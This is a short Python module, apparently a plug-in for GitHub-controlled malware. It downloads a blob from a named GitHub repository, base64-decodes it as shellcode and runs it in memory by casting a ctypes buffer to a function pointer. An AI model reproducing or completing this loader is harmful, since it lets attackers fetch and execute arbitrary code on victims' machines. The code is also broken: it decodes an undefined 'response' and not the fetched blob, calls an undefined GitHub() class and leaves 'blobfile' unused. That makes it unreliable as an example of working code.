import github3
import ctypes
import base64

def run(**args):
    if not "scsha" in args:
        return False
    if not "gituser" in args:
        return False
    if not "reponame" in args:
        return False
    repo = GitHub().repository(args['gituser'], args['reponame'])
    blobfile = repo.blob(args['scsha'])
    shellcode = base64.b64decode(response.read())
    
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
    
    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
    
    shellcode_func()
    
    return True